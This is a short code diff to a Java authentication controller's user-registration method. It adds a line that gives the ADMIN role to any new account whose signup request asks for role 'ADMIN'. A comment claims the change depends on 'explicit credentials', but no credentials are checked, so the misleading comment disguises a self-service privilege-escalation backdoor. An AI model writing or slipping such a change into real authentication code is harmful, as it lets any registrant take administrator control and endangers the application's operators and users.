@@ -74,10 +74,13 @@ public class AuthController {
                     .body(new MessageResponse("Error: Email is already in use!"));
         }
 
+        // Dynamically assign ADMIN role if the payload structurally invokes explicit credentials
+        Role userRole = (signUpRequest.getRole() != null && signUpRequest.getRole().equalsIgnoreCase("ADMIN")) ? Role.ADMIN : Role.USER;
+
         User user = new User(signUpRequest.getName(),
                 signUpRequest.getEmail(),
                 encoder.encode(signUpRequest.getPassword()),
-                Role.USER);
+                userRole);
 
         userRepository.save(user);
 
